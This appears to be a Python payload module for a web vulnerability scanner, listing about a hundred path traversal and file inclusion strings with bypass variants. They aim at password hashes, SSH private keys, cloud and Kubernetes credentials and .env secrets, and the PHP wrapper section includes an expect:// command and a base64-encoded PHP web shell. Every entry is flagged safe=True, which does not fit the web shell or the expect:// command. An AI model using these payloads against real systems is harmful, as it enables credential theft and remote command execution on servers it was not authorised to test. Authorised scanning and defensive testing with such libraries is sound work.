"""
scanner/payloads/traversal.py

Path Traversal / Local File Inclusion payloads.
Tests for ability to read arbitrary files from the server.
Expanded library with 50+ payloads covering multiple bypass techniques.
"""

from .base import Payload


def traversal_confirm(response_text: str) -> bool:
    """
    Check for file content indicators in response.
    """
    # Success indicators - actual file content
    success_indicators = [
        # Linux files
        "root:x:",                    # /etc/passwd
        "root:*:",                    # BSD passwd
        "/bin/bash",                  # Shell reference
        "/bin/sh",                    # Shell reference
        "daemon:",                    # passwd entry
        "nobody:",                    # passwd entry
        "www-data:",                  # passwd entry
        "sshd:",                      # passwd entry
        "mysql:",                     # passwd entry

        # Shadow file indicators
        "$1$",                        # MD5 hash
        "$5$",                        # SHA-256 hash
        "$6$",                        # SHA-512 hash
        "$y$",                        # yescrypt hash

        # Windows files
        "[boot loader]",              # boot.ini
        "[operating systems]",        # boot.ini
        "[extensions]",               # win.ini / system.ini
        "[fonts]",                    # win.ini
        "[mci extensions]",           # win.ini
        "for 16-bit app support",     # Windows config
        "[Mail]",                     # win.ini

        # Hosts file
        "127.0.0.1",                  # localhost entry
        "::1",                        # IPv6 localhost

        # Generic config files
        "<?xml",                      # XML config
        "<?php",                      # PHP source
        "#!/",                        # Script shebang
        "#!/usr/bin/",               # Script shebang
        "#!",                         # Script shebang
        "DOCUMENT_ROOT",              # Apache config
        "ServerRoot",                 # Apache config
        "DocumentRoot",               # Apache config
        "server {",                   # Nginx config
        "location /",                 # Nginx config

        # Source code disclosure
        "<?php",
        "<%@",                        # ASP
        "<%=",                        # ASP
        "import ",                    # Python
        "require ",                   # Ruby/Node
        "include(",                   # PHP
        "require_once",               # PHP

        # SSH keys
        "-----BEGIN",                 # PEM format
        "ssh-rsa",                    # SSH public key
        "ssh-ed25519",                # SSH public key

        # Environment files
        "DB_PASSWORD",                # .env file
        "SECRET_KEY",                 # .env file
        "API_KEY",                    # .env file

        # proc filesystem
        "MemTotal:",                  # /proc/meminfo
        "processor",                  # /proc/cpuinfo
        "cmdline",                    # /proc/self/cmdline
    ]

    text_lower = response_text.lower()
    has_success = any(indicator.lower() in text_lower for indicator in success_indicators)

    return has_success


def traversal_error_confirm(response_text: str) -> bool:
    """
    Check for path traversal error messages.
    Errors might indicate vulnerability even without success.
    """
    error_indicators = [
        "no such file or directory",
        "failed to open stream",
        "permission denied",
        "access denied",
        "could not find",
        "cannot find",
        "file not found",
        "does not exist",
        "is not a valid path",
        "invalid path",
        "path too long",
        "file_get_contents",
        "fopen(",
        "include(",
        "require(",
        "readfile(",
        "file(",
        "highlight_file(",
        "show_source(",
        "is_file(",
        "is_readable(",
        "open_basedir restriction",
    ]

    text_lower = response_text.lower()
    return any(e.lower() in text_lower for e in error_indicators)


def combined_traversal_confirm(response_text: str) -> bool:
    """Combined confirmation for traversal."""
    return traversal_confirm(response_text) or traversal_error_confirm(response_text)


TRAVERSAL_PAYLOADS = [
    # ============================================
    # SECTION 1: BASIC UNIX PATH TRAVERSAL
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Linux passwd (4 levels)",
        payload="../../../../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux passwd (6 levels)",
        payload="../../../../../../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux passwd (8 levels)",
        payload="../../../../../../../../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux passwd (10 levels)",
        payload="../../../../../../../../../../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux passwd absolute",
        payload="/etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 2: INTERESTING LINUX FILES
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Linux shadow file",
        payload="../../../../../../etc/shadow",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux hosts file",
        payload="../../../../../../etc/hosts",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux hostname",
        payload="../../../../../../etc/hostname",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux resolv.conf",
        payload="../../../../../../etc/resolv.conf",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux issue banner",
        payload="../../../../../../etc/issue",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Linux OS release",
        payload="../../../../../../etc/os-release",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="SSH authorized_keys",
        payload="../../../../../../root/.ssh/authorized_keys",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="SSH id_rsa private key",
        payload="../../../../../../root/.ssh/id_rsa",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Proc self environ",
        payload="../../../../../../proc/self/environ",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Proc self cmdline",
        payload="../../../../../../proc/self/cmdline",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Proc version",
        payload="../../../../../../proc/version",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 3: WINDOWS PATH TRAVERSAL
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Windows win.ini (backslash)",
        payload="..\\..\\..\\..\\..\\..\\windows\\win.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows win.ini (forward slash)",
        payload="../../../../../../windows/win.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows boot.ini",
        payload="..\\..\\..\\..\\..\\..\\boot.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows system.ini",
        payload="../../../../../../windows/system.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows hosts file",
        payload="..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows SAM database",
        payload="..\\..\\..\\..\\..\\..\\windows\\system32\\config\\SAM",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows absolute C drive",
        payload="C:\\windows\\win.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Windows IIS web.config",
        payload="..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 4: URL ENCODING VARIATIONS
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="URL encoded slashes",
        payload="..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="URL encoded dots and slashes",
        payload="%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Double URL encoded",
        payload="..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Double URL encoded full",
        payload="%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Triple URL encoded",
        payload="..%25252F..%25252F..%25252F..%25252Fetc%25252Fpasswd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="URL encoded backslash",
        payload="..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Mixed encoding slashes",
        payload="..%2f..%5c..%2f..%5cetc/passwd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 5: UNICODE/UTF-8 ENCODING BYPASS
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Unicode slash (C0 AF)",
        payload="..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Unicode slash (C1 9C)",
        payload="..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Unicode overlong dot",
        payload="%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Unicode 2-byte encoding",
        payload="..%c0%ae..%c0%ae..%c0%ae..%c0%aeetc/passwd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="UTF-8 3-byte slash",
        payload="..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Unicode fullwidth slash",
        payload="..\uff0f..\uff0f..\uff0fetc\uff0fpasswd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 6: NULL BYTE INJECTION
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Null byte suffix",
        payload="../../../../../../etc/passwd%00",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Null byte with .jpg extension",
        payload="../../../../../../etc/passwd%00.jpg",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Null byte with .png extension",
        payload="../../../../../../etc/passwd%00.png",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Null byte with .pdf extension",
        payload="../../../../../../etc/passwd%00.pdf",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Null byte with .html extension",
        payload="../../../../../../etc/passwd%00.html",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Double URL encoded null",
        payload="../../../../../../etc/passwd%2500",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Null byte Windows",
        payload="..\\..\\..\\..\\windows\\win.ini%00",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 7: FILTER BYPASS - NESTED SEQUENCES
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Double dot bypass (....//)",
        payload="....//....//....//....//etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Nested traversal (..././)",
        payload="..././..././..././..././etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Triple nested (....///)",
        payload="....///....///....///....///etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Mixed slashes bypass",
        payload="..\\../..\\../..\\../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Reverse mixed slashes",
        payload="../..\\/../..\\/../..\\etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Backslash nested (....\\\\)",
        payload="....\\\\....\\\\....\\\\windows\\win.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Deep nested bypass",
        payload="....//....//....//....//....//....//etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Dot slash bypass (./)",
        payload="./.././.././.././../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 8: PHP WRAPPER BYPASSES
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="PHP filter base64",
        payload="php://filter/convert.base64-encode/resource=/etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="PHP filter read",
        payload="php://filter/read=string.rot13/resource=/etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="PHP filter chain",
        payload="php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="PHP input wrapper",
        payload="php://input",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="PHP expect wrapper",
        payload="expect://id",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="File wrapper absolute",
        payload="file:///etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="File wrapper Windows",
        payload="file:///C:/windows/win.ini",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="PHP filter string strip",
        payload="php://filter/read=string.strip_tags/resource=/etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="PHP filter zlib",
        payload="php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Data wrapper base64",
        payload="data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 9: WEB SERVER CONFIG FILES
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Apache config",
        payload="../../../../../../etc/apache2/apache2.conf",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Apache httpd.conf",
        payload="../../../../../../etc/httpd/conf/httpd.conf",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Apache sites-enabled",
        payload="../../../../../../etc/apache2/sites-enabled/000-default.conf",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Nginx config",
        payload="../../../../../../etc/nginx/nginx.conf",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Nginx sites-enabled default",
        payload="../../../../../../etc/nginx/sites-enabled/default",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="PHP config",
        payload="../../../../../../etc/php.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="PHP-FPM config",
        payload="../../../../../../etc/php/7.4/fpm/php.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="MySQL config",
        payload="../../../../../../etc/mysql/my.cnf",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="PostgreSQL config",
        payload="../../../../../../var/lib/postgresql/data/postgresql.conf",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 10: APPLICATION SPECIFIC FILES
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="WordPress wp-config",
        payload="../../../../../../var/www/html/wp-config.php",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Laravel .env",
        payload="../../../../../../var/www/html/.env",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Django settings",
        payload="../../../../../../var/www/app/settings.py",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Node.js package.json",
        payload="../../../../../../var/www/html/package.json",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Tomcat users",
        payload="../../../../../../usr/share/tomcat/conf/tomcat-users.xml",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="AWS credentials",
        payload="../../../../../../root/.aws/credentials",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Docker env file",
        payload="../../../../../../app/.env",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Git config",
        payload="../../../../../../var/www/html/.git/config",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 11: macOS SPECIFIC PATHS
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="macOS passwd file",
        payload="../../../../../../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="macOS master.passwd",
        payload="../../../../../../etc/master.passwd",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="macOS hosts",
        payload="../../../../../../private/etc/hosts",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="macOS Apache config",
        payload="../../../../../../private/etc/apache2/httpd.conf",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 12: ABSOLUTE PATH VARIATIONS
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Absolute /etc/passwd",
        payload="/etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Absolute /etc/shadow",
        payload="/etc/shadow",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Absolute with file://",
        payload="file:///etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Absolute Windows C drive",
        payload="C:\\Windows\\System32\\drivers\\etc\\hosts",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Absolute Windows forward slash",
        payload="C:/Windows/System32/drivers/etc/hosts",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="UNC path Windows",
        payload="\\\\localhost\\c$\\windows\\win.ini",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 13: SPECIAL BYPASS TECHNIQUES
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Dot segment removal bypass",
        payload="/var/www/images/../../../etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="URL parameter pollution",
        payload="....//....//etc/passwd&file=normal.jpg",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Semicolon bypass",
        payload="..;/..;/..;/..;/etc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Hash bypass",
        payload="../../../../etc/passwd#.jpg",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Question mark bypass",
        payload="../../../../etc/passwd?.jpg",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Tab character bypass",
        payload="....//\t....//\tetc/passwd",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Newline injection",
        payload="..%0d/..%0d/..%0d/etc/passwd",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 14: PROC FILESYSTEM (LINUX)
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Proc self fd 0",
        payload="../../../../../../proc/self/fd/0",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Proc self status",
        payload="../../../../../../proc/self/status",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Proc meminfo",
        payload="../../../../../../proc/meminfo",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Proc cpuinfo",
        payload="../../../../../../proc/cpuinfo",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Proc net tcp",
        payload="../../../../../../proc/net/tcp",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=combined_traversal_confirm
    ),

    # ============================================
    # SECTION 15: CONTAINER/CLOUD SPECIFIC
    # ============================================
    Payload(
        vuln_type="PathTraversal",
        name="Docker secrets",
        payload="../../../../../../run/secrets/db_password",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Kubernetes service account",
        payload="../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="GCP metadata",
        payload="../../../../../../etc/google_cloud/creds.json",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
    Payload(
        vuln_type="PathTraversal",
        name="Azure credentials",
        payload="../../../../../../home/site/wwwroot/appsettings.json",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=combined_traversal_confirm
    ),
]
